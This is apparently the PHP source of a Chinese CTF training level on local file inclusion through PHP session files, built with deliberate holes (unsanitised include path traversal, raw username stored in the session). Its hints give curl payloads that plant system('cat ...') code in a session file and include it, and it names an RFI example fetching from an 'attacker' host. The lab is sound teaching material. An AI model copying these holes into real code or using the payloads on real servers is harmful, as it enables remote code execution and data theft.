<?php
// ============================================================
// lfi5 · session 文件包含（+RFI 概念讲解）
// 漏洞1：include('pages/' . $page) 目录穿越（同 lfi1/lfi4）
// 漏洞2：登录把用户名原样写入 session → session 文件里出现
//        <?php ... ? >  → 包含 sess_<PHPSESSID> 即执行
// 说明：本站带 pages/ 前缀且未开 allow_url_include，RFI 不可行，
//       故按题设采用 session 文件包含路线（RFI 作为知识点讲解）
// ============================================================
$__dir = __DIR__;
if (!is_dir($__dir . '/sessions')) { @mkdir($__dir . '/sessions', 0777, true); }
session_save_path($__dir . '/sessions');   // 教学自包含：session 文件固定在本目录（真实环境在 /var/lib/php/sessions 或 /tmp）
session_start();

$welcome = null;
if (isset($_POST['username'])) {
    // 存进 session 时未做任何处理（漏洞点）；展示时才转义
    $_SESSION['user'] = $_POST['username'];
    $welcome = $_POST['username'];
}
if (isset($_GET['action']) && $_GET['action'] === 'logout') {
    session_destroy();
    echo '<script>location.href="./"</script>'; exit;
}

$page = isset($_GET['page']) ? $_GET['page'] : 'home.php';
$included = null; $not_found = false;
if ($page !== '') {
    $target = 'pages/' . $page;
    if (@file_exists($target)) {
        ob_start();
        include($target);
        $included = ob_get_clean();
    } else {
        $not_found = true;
    }
}
?>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>lfi5 · session 文件包含 | CTF 教学靶场</title>
<style>
:root{--bg:#0f172a;--card:#1e293b;--ink:#e2e8f0;--dim:#94a3b8;--acc:#38bdf8;--ok:#4ade80;--warn:#fbbf24;--bad:#f87171}
*{box-sizing:border-box}body{margin:0;font-family:"Segoe UI",system-ui,-apple-system,sans-serif;background:var(--bg);color:var(--ink);line-height:1.75}
.wrap{max-width:920px;margin:0 auto;padding:24px 16px 60px}
.badge{display:inline-block;background:#22c55e;color:#04121f;font-weight:700;font-size:12px;padding:2px 10px;border-radius:999px;letter-spacing:1px}
h1{font-size:26px;margin:10px 0 4px}.meta{color:var(--dim);font-size:13px;margin-bottom:6px}
.card{background:var(--card);border:1px solid #334155;border-radius:12px;padding:18px 20px;margin:16px 0}
.card h2{margin:0 0 10px;font-size:17px;color:var(--acc);border-left:3px solid var(--acc);padding-left:8px}
pre,code{font-family:Consolas,Menlo,"Courier New",monospace}
pre{background:#0b1220;border:1px solid #27364d;border-radius:8px;padding:12px;overflow:auto;font-size:13px}
code{background:#0b1220;border-radius:4px;padding:1px 6px;font-size:13px}
input[type=text]{width:65%;min-width:220px;padding:8px 10px;border-radius:8px;border:1px solid #475569;background:#0b1220;color:var(--ink)}
button{padding:8px 18px;border-radius:8px;border:0;background:var(--acc);color:#04121f;font-weight:700;cursor:pointer}
button:hover{filter:brightness(1.15)}
.result{background:#0b1220;border:1px solid #27364d;border-radius:8px;margin-top:12px}
.result .t{padding:6px 12px;border-bottom:1px solid #27364d;color:var(--dim);font-size:12px}
.result pre{border:0;margin:0}
.errbox{background:#3b1519;border:1px solid #7f1d1d;color:#fca5a5;border-radius:8px;padding:10px 14px;margin-top:12px}
.okbox{background:#052e1a;border:1px solid #14532d;color:#86efac;border-radius:8px;padding:10px 14px;margin-top:12px}
details{background:#0b1220;border:1px solid #27364d;border-radius:8px;padding:10px 14px;margin:8px 0}
summary{cursor:pointer;color:var(--warn);font-weight:600}
table{border-collapse:collapse;width:100%;font-size:14px}td,th{border:1px solid #334155;padding:6px 10px;text-align:left}th{color:var(--acc)}
.nav{display:flex;justify-content:space-between;margin-top:22px}.nav a{color:var(--acc);text-decoration:none}
footer{color:--dim;font-size:12px;text-align:center;margin-top:30px}
.flagrow{display:flex;gap:8px;flex-wrap:wrap}#flagResult{margin-top:8px;font-size:14px;color:var(--warn);word-break:break-all}
</style>
</head>
<body>
<div class="wrap">
<header>
<span class="badge">文件包含 · 第 5 关</span>
<h1>会员中心 —— session 文件包含</h1>
<div class="meta">难度：★★★★☆ 高阶 | 关卡 ID：<code>lfi5</code> · 运行时：PHP</div>
</header>
<!-- OPS-CHECK: /flag_lfi5.txt <?= @file_exists('/flag_lfi5.txt')?'READY':'MISSING(复制 deploy/flag_lfi5.txt 到 /)' ?> sessions/ 需可写 -->

<section class="card">
<h2>题目描述</h2>
<p>会员中心上线：登录后系统把你的<b>用户名存进 session</b>，用于"欢迎回来，xxx"。</p>
<p>include 的老毛病依然没修（<code>?page=</code> 可穿越）。日志那招这次不好使（日志不在了），但服务器上还有一个<b>你能控制内容的文件</b>……目标：执行命令拿到根目录 <code>/flag_lfi5.txt</code> 的 flag。</p>
</section>

<section class="card">
<h2>实验区 · 登录</h2>
<?php if ($welcome !== null): ?>
<div class="okbox">✅ 登录成功，欢迎回来：<code><?= htmlspecialchars($welcome, ENT_QUOTES) ?></code>（你的 PHPSESSID：<?= htmlspecialchars(session_id(), ENT_QUOTES) ?>）</div>
<?php endif; ?>
<form method="post" action="">
<label>用户名：<input type="text" name="username" placeholder="随便起个名字"></label>
<button type="submit">登录</button>
</form>
<?php if (isset($_SESSION['user'])): ?><p style="color:var(--dim);font-size:13px">当前 session 已记录用户名（<a href="?action=logout" style="color:var(--acc)">退出登录</a>）</p><?php endif; ?>
</section>

<section class="card">
<h2>实验区 · 页面包含</h2>
<form method="get" action="">
<label>page：<input type="text" name="page" placeholder="例如 home.php" value="<?= htmlspecialchars($page, ENT_QUOTES) ?>"></label>
<button type="submit">打开页面</button>
</form>
<?php if ($not_found): ?>
<div class="errbox">⚠️ include: 文件 <code>pages/<?= htmlspecialchars($page, ENT_QUOTES) ?></code> 不存在</div>
<?php elseif ($included !== null): ?>
<div class="result"><div class="t">include('pages/<?= htmlspecialchars($page, ENT_QUOTES) ?>') 的输出</div>
<pre><?= htmlspecialchars($included, ENT_QUOTES) ?></pre></div>
<?php endif; ?>
</section>

<section class="card">
<h2>知识点讲解</h2>
<p><b>session 文件也是"你能写入的文件"</b>：PHP 默认（files handler）把 session 存成文件：</p>
<table>
<tr><th>环境</th><th>路径</th><th>文件名</th></tr>
<tr><td>本站（教学自包含）</td><td><code>题目目录/sessions/</code></td><td><code>sess_&lt;PHPSESSID&gt;</code></td></tr>
<tr><td>Debian 系 + php-fpm</td><td><code>/var/lib/php/sessions/</code></td><td>同上（穿越：<code>../../../../../var/lib/php/sessions/sess_XXX</code>）</td></tr>
<tr><td>默认编译值</td><td><code>/tmp</code></td><td>同上</td></tr>
</table>
<p>关键：<b>session 里的值来自哪里？</b>本站把 <code>$_POST['username']</code> 原样写入 <code>$_SESSION['user']</code>。session 文件内容会是这样：</p>
<pre>user|s:41:"&lt;?php system('cat /flag_lfi5.txt');?&gt;";</pre>
<p>把 PHP 代码通过"用户名"塞进 session 文件，再用 LFI 包含这个文件——和日志包含是同一个模型：<b>污染 → 触发</b>，只是写入面换成了 session。</p>
<p><b>顺便讲讲 RFI（远程文件包含）</b>：如果代码是 <code>include($_GET['page'])</code>（无前缀）且 <code>allow_url_include=On</code>，那么 <code>?page=http://attacker/shell.txt</code> 会直接包含并执行远程文件——威力最大也最简单。本站拼了 <code>pages/</code> 前缀且未开该选项，RFI 不可行（这也是防御 RFI 的两个有效手段）。</p>
</section>

<section class="card">
<h2>渐进提示</h2>
<details><summary>提示 1：找一个"你写内容、它落盘"的地方</summary><p>日志没了，但登录功能还在：你提交的用户名被存到了服务器某个文件里。它的路径和文件名有什么规律？（页面已经告诉你文件名规则）</p></details>
<details><summary>提示 2：让 session 文件里出现代码</summary><p>用 <code>&lt;?php system('cat /flag_lfi5.txt');?&gt;</code> 当用户名登录一次（curl 记得存 cookie 拿 PHPSESSID）。</p></details>
<details><summary>提示 3：payload</summary><p><code>curl -c jar --data-urlencode "username=&lt;?php system('cat /flag_lfi5.txt');?&gt;" http://HOST/lfi5/</code><br><code>curl -b jar "http://HOST/lfi5/?page=../sessions/sess_&lt;你的PHPSESSID&gt;"</code></p></details>
</section>

<section class="card">
<h2>提交 Flag</h2>
<form id="flagForm" class="flagrow" onsubmit="return false">
<input type="text" id="flagInput" placeholder="flag{...}" style="flex:1">
<button onclick="submitFlag()">提交</button>
</form>
<div id="flagResult"></div>
</section>

<nav class="nav"><a href="../lfi4">← 上一关：lfi4</a><a href="../ssrf1">下一关：ssrf1 · SSRF →</a></nav>
<footer>CTF Web 教学式靶场 · B 组 · 仅用于安全学习</footer>
</div>
<script>
function submitFlag(){
  var v=document.getElementById('flagInput').value.trim();
  var el=document.getElementById('flagResult');
  if(!v){el.textContent='请输入 flag';return}
  el.textContent='提交中...';
  fetch('/api/verify',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'challenge_id=lfi5&flag='+encodeURIComponent(v)})
   .then(function(r){return r.text().then(function(t){
      var msg='HTTP '+r.status+': '+t;
      try{var j=JSON.parse(t);
        if(typeof j.correct==='boolean')msg=j.correct?'✅ 回答正确！':'❌ flag 不对，再试试';
        else if(j.message!==undefined)msg=j.message;
      }catch(e){}
      el.textContent=msg;})})
   .catch(function(e){el.textContent='提交失败('+e.message+')：请从靶场门户页提交'});
}
</script>
</body>
</html>
